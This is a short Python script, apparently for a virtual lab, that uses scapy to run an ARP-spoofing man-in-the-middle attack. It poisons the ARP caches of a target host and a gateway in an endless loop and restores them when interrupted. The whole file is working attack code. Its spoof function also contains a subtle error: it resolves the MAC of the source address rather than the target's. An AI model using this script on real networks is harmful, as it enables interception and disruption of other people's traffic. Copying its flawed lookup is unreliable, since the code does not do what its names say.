import scapy.all as scapy
import time


def get_mac(ip_address):
    arp_request = scapy.ARP(pdst=ip_address)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=1)[0]

    #print(answered_list)
    #print(answered_list[0][1].hwsrc)
    return answered_list[0][1].hwsrc


def spoof(tgt_ip, src_ip):
    tgt_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=tgt_ip, hwdst=tgt_mac, psrc=src_ip)
    scapy.send(packet, verbose=False)
    return


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)
    return


tgt_ip = "10.0.2.6"
gw_ip = "10.0.2.1"

try:
    packet_count = 0
    while True:
        spoof(tgt_ip, gw_ip)
        spoof(gw_ip, tgt_ip)
        packet_count += 1
        print(f"\r[+] Packets sent: {packet_count * 2}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C ... Resetting ARP tables, please wait.")
    restore(tgt_ip, gw_ip)
    restore(gw_ip, tgt_ip)
    print("\n[+] ARP tables restored.")

print("\nGoodbye!")
